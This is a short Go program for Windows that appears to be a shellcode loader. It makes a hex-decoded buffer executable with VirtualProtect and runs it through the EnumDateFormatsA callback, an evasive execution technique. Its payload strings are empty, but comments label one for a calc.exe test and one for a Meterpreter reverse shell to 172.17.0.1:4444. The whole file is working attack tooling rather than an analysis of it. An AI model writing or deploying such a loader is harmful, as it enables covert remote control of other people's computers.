//go:build windows
// +build windows

package main

import (
	"encoding/hex"
	"unsafe"
	"golang.org/x/sys/windows"
)


func main() {
	// Calc.exe
	shellcode, _ := hex.DecodeString("")
	
	// meterpreter : 172.17.0.1 4444
	// shellcode, _ := hex.DecodeString("")

        
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	EnumDateFormatsA := kernel32.NewProc("EnumDateFormatsA")

	oldProtect := windows.PAGE_READWRITE
	VirtualProtect.Call((uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	
	EnumDateFormatsA.Call((uintptr)(unsafe.Pointer(&shellcode[0])), 0, 0)
}
